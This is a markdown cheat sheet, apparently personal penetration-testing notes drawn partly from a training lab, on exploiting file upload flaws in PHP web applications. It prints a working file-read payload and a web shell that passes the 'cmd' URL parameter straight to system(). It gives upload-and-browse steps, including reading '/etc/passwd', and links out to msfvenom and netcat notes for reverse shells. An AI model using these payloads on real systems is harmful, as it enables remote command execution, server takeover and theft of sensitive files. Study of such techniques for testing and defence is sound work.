# File Upload Vulnerability Exploitation Cheat Sheet

This document outlines the techniques used to exploit file upload vulnerabilities in web applications, specifically focusing on PHP-based payloads. File upload vulnerabilities allow an attacker to upload malicious files to a server, which can lead to remote code execution (RCE), information disclosure, or complete server compromise. Below are example scripts and explanations for common exploitation techniques.

## PHP Payloads for File Upload Exploitation
### 1. File Read Exploit

This script is used to read the contents of a file on the server. If the server executes uploaded PHP files, an attacker can upload this script and then access it through a browser to read sensitive files.

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Use case:**
- Reading sensitive files on the system such as `/etc/passwd`, application configuration files, or any custom path like `/home/carlos/secret`.

**Execution:**
- Upload the script to the web server.
- Navigate to the uploaded file in the browser (e.g., `http://example.com/uploads/shell.php`) to view the file contents.

### 2. Remote Command Execution (RCE) Shell

This PHP script allows the execution of arbitrary system commands by passing them as a query string parameter in the URL.

```php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];  // Get command from the query string
    system($cmd);         // Execute the command and display output
    echo "</pre>";
}
?>
```

**Use case:**
- Provides a web shell interface for remote command execution on the compromised server.

**Execution:**
1. Upload the script to the vulnerable web application.
2. Access the script in a browser and append the command using the `cmd` parameter:
   ```
   http://example.com/uploads/shell.php?cmd=whoami
   ```
3. Replace `whoami` with any system command (e.g., `ls`, `id`, `cat /etc/passwd`).

**Note:** This method requires the web server to execute PHP files and not sanitize or restrict uploaded content.

---
## Crafting Payloads for Reverse Shells
To craft payloads for a remote shell to connect back to our attacking device, we can refer to [Metasploit – Msfvenom](./Tools%20&%20Commands/Metasploit/msfvenom.md) to craft our payloads.

Once we create our payload with [Metasploit – Msfvenom](./Tools%20&%20Commands/Metasploit/msfvenom.md) and upload it to the server, we can start a remote listener either with [Netcat & Socat](./Tools%20&%20Commands/Netcat/netcat%20socat.md) or by using Metasploits handler at [Metasploit – Msfvenom](./Tools%20&%20Commands/Metasploit/msfvenom.md).    
